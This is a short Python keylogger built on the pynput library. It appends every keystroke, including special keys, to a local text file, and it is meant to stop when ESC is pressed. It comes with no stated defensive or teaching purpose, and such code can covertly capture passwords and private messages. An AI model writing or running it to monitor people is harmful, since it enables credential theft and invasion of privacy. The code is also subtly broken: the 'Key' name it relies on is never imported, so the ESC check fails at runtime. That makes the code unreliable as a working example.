from pynput.keyboard import Listener

# File to store keystrokes
log_file = "key_log.txt"

def on_press(key):
    try:
        # Convert key to string and append to log file
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

def on_release(key):
    # Stop logging if ESC key is pressed
    if key == Key.esc:
        return False

# Start listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
